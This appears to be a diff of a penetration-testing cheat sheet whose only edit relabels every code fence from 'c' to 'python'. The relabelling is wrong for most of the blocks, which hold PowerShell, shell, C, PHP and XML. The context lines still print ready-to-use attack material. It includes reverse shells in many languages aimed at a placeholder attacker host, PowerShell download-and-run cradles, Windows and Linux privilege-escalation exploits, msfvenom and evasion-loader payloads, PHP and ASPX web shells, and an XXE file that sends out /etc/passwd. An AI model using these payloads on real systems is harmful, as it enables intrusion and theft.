 sudoedit /etc/motd
 ```
 
 #### CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)
 
-```c
+```python
 Import-Module .\CVE-2023-23397.ps1
 Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
 ```
@@ -4850,13 +4850,13 @@ Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav
 
 - Linux ubuntu2204 5.19.0-46-generic
 
-```c
+```python
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
 ```
 
 #### CVE-2023-4911: Looney Tunables LPE
 
-```c
+```python
 python3 gen_libc.py 
 [*] '/lib/x86_64-linux-gnu/libc.so.6'
     Arch:     amd64-64-little
@@ -4866,7 +4866,7 @@ python3 gen_libc.py
     PIE:      PIE enabled
 ```
 
-```c
+```python
 gcc -o exp exp.c
 ./exp
 ```
@@ -4875,7 +4875,7 @@ gcc -o exp exp.c
 
 > https://github.com/BeichenDream/GodPotato
 
-```c
+```python
 .\GodPotato-NET4.exe -cmd '<COMMAND>'
 ```
 
@@ -4887,7 +4887,7 @@ gcc -o exp exp.c
 
 ##### GetCLSID.ps1
 
-```c
+```python
 <#
 This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
 Then exports to CSV
@@ -4950,7 +4950,7 @@ $RESULT | ogv
 
 ##### Execution
 
-```c
+```python
 .\JuicyPotato.exe -l 1337 -c "\{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
 ```
 
@@ -4958,7 +4958,7 @@ $RESULT | ogv
 
 > https://github.com/antonioCoco/JuicyPotatoNG
 
-```c
+```python
 .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
@@ -4966,16 +4966,16 @@ $RESULT | ogv
 
 > https://www.exploit-db.com/exploits/1518
 
-```c
+```python
 gcc -g -c raptor_udf2.c -fPIC
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 
-```c
+```python
 mysql -u root
 ```
 
-```c
+```python
 > use mysql;
 > create table foo(line blob);
 > insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
@@ -4988,7 +4988,7 @@ mysql -u root
 
 > https://github.com/itm4n/PrintSpoofer
 
-```c
+```python
 .\PrintSpoofer64.exe -i -c powershell
 ```
 
@@ -4996,7 +4996,7 @@ mysql -u root
 
 > https://github.com/bugch3ck/SharpEfsPotato
 
-```c
+```python
 SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
@@ -5006,7 +5006,7 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ##### Modifying Exploit
 
-```c
+```python
         // get a FS reference from something mounted in from outside
         if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
                 die("[-] open");
@@ -5017,7 +5017,7 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ##### Compiling
 
-```c
+```python
 gcc shocker.c -o shocker
 cc -Wall -std=c99 -O2 shocker.c -static
 ```
@@ -5026,7 +5026,7 @@ cc -Wall -std=c99 -O2 shocker.c -static
 
 #### Donut
 
-```c
+```python
 donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
 ```
 
@@ -5034,7 +5034,7 @@ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
 
 ##### PHP into JPG Injection
 
-```c
+```python
 exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
 exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
 exiftool "-comment<=back.php" back.png
@@ -5043,7 +5043,7 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
 
 #### GhostScript
 
-```c
+```python
 %!PS-Adobe-3.0 EPSF-3.0
 %%BoundingBox: -0 -0 100 100
 userdict /setpagedevice undef
@@ -5057,7 +5057,7 @@ mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) cur
 
 #### nishang
 
-```c
+```python
 cd path/to/nishang/Shells/
 cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
 
@@ -5073,7 +5073,7 @@ powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>
 
 ##### Bash Reverse Shell
 
-```c
+```python
 bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
 bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
 echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
@@ -5081,13 +5081,13 @@ echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
 
 ##### curl Reverse Shell
 
-```c
+```python
 curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '\{"auth": \{"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
 ```
 
 ##### Groovy (Jenkins) Reverse Shell
 
-```c
+```python
 String host="<LHOST>";
 int port=<LPORT>;
 String cmd="/bin/bash";
@@ -5096,7 +5096,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ##### JAVA Reverse Shell
 
-```c
+```python
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
@@ -5106,7 +5106,7 @@ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>
 
 ###### shell.jar
 
-```c
+```python
 package <NAME>;
 
 import org.bukkit.plugin.java.JavaPlugin;
@@ -5138,57 +5138,57 @@ public void onEnable() \{
 
 ##### Lua Reverse Shell
 
-```c
+```python
 http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
 ```
 
 ##### Markdown Reverse Shell
 
-```c
+```python
 --';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
 ```
 
 ##### mkfifo Reverse Shell
 
-```c
+```python
 mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
 ```
 
 ##### Netcat Reverse Shell
 
-```c
+```python
 nc -e /bin/sh <LHOST> <LPORT>
 ```
 
 ##### Perl Reverse Shell
 
-```c
+```python
 perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))\{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 ##### PHP Reverse Shell
 
-```c
+```python
 php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ##### PowerShell Reverse Shell
 
-```c
+```python
 $client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". \{ $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-```c
+```python
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-```c
+```python
 powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
 ##### minireverse.ps1
 
-```c
+```python
 $socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
 if($socket -eq $null)\{exit 1}
 $stream = $socket.GetStream();
@@ -5247,25 +5247,25 @@ $stream.Dispose()
 
 ##### Python Reverse Shell
 
-```c
+```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-```c
+```python
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-```c
+```python
 python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
 ```
 
-```c
+```python
 echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
 ```
 
 ##### Ruby Reverse Shell
 
-```c
+```python
 ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
@@ -5275,19 +5275,19 @@ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh 
 
 ###### Shellcode Payload Creation with msfvenom
 
-```c
+```python
 msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
 ```
 
 ###### .msi-File Payload Creation with msfvenom
 
-```c
+```python
 msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
 ```
 
 ##### Listener
 
-```c
+```python
 msf6 > use exploit/multi/handler
 msf6 > set payload windows/x64/meterpreter/reverse_https
 ```
@@ -5296,36 +5296,36 @@ msf6 > set payload windows/x64/meterpreter/reverse_https
 
 ###### DLL Side-Loading
 
-```c
+```python
 ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
 ```
 ###### Windows Script Host
 
-```c
+```python
 ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
 ```
 
 ###### Control Panel Files
 
-```c
+```python
 ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
 ```
 
 ##### Renaming Payload
 
-```c
+```python
 mv <FILE>.dll <FILE>32.dll
 ```
 
 ##### Execution
 
-```c
+```python
 rundll32.exe .\<FILE>32.dll,DllRegisterServer
 ```
 
 or
 
-```c
+```python
 regsvr32 /s .\<FILE>32.dll
 ```
 
@@ -5333,7 +5333,7 @@ For `.cpl-Files` a simple double click is enough to execute them.
 
 #### Shikata Ga Nai
 
-```c
+```python
 msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
 
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
@@ -5343,7 +5343,7 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LP
 
 ##### PHP Web Shell
 
-```c
+```python
 <?php system($_GET['cmd']); ?>
 <?php echo exec($_POST['cmd']); ?>
 <?php echo passthru($_GET['cmd']); ?>
@@ -5353,7 +5353,7 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LHOST> LP
 
 #### ysoserial
 
-```c
+```python
 java -jar ysoserial-master-SNAPSHOT.jar
 java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <LHOST> <LPORT> -e /bin/sh' | base64 -w 0
 java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
@@ -5364,7 +5364,7 @@ java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$f
 
 #### ASPX Web Shell
 
-```c
+```python
 <?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
@@ -5395,7 +5395,7 @@ Response.write(o)
 
 #### Bad YAML
 
-```c
+```python
 - hosts: localhost
   tasks:
     - name: badyml
@@ -5404,7 +5404,7 @@ Response.write(o)
 
 #### Exploit Skeleton Python Script
 
-```c
+```python
 #!/usr/bin/python
 
 import socket,sys
@@ -5428,7 +5428,7 @@ finally:
 
 #### JSON POST Request
 
-```c
+```python
 POST /<path> HTTP/1.1
 Host: <RHOST>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -5495,7 +5495,7 @@ class Redirect(BaseHTTPRequestHandler):
 HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
 ```
 
-```c
+```python
 sudo python3 redirect.py http://127.0.0.1:3000/
 ```
 
@@ -5569,7 +5569,7 @@ r = requests.post('<RHOST>', data=\{'key': 'value'}, cookies=\{'PHPSESSID': r.co
 
 ##### Request
 
-```c
+```python
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
 "http://<LHOST>/<FILE>.dtd">%<NAME>;]>
@@ -5585,7 +5585,7 @@ r = requests.post('<RHOST>', data=\{'key': 'value'}, cookies=\{'PHPSESSID': r.co
 
 ##### Content of <FILE>.dtd
 
-```c
+```python
 <!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
 %eval;
